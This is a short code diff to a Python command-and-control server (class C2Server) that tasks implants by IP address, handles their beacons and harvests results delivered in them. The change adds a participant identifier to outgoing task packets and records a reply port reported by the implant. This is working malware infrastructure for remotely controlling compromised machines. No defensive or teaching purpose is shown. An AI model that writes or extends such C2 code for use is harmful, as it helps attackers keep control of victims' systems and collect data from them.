@@ -82,7 +82,8 @@ class C2Server:
             timestamp  = time.time(),
             payload    = {"task": task_type, **params},
         )
-        ok = self.transport.send_unicast(sess.implant_ip, pkt)
+        participant_id = 1 if sess.reply_port else 0
+        ok = self.transport.send_unicast(sess.implant_ip, pkt, participant_id)
         if ok:
             sess.tasks_sent.append({"task": task_type, "params": params, "ts": time.time()})
         return ok
@@ -98,7 +99,8 @@ class C2Server:
             timestamp  = time.time(),
             payload    = {},
         )
-        return self.transport.send_unicast(sess.implant_ip, pkt)
+        participant_id = 1 if sess.reply_port else 0
+        return self.transport.send_unicast(sess.implant_ip, pkt, participant_id)
 
     # ── beacon handler ────────────────────────────────────────────────────────
 
@@ -130,6 +132,9 @@ class C2Server:
                 hostname = pkt.payload.get("hostname", "")
                 if hostname:
                     sess.hostname = hostname
+                reply_port = pkt.payload.get("reply_port", 0)
+                if reply_port:
+                    sess.reply_port = reply_port
 
                 # Harvest any results delivered in the beacon
                 results = pkt.payload.get("results", [])
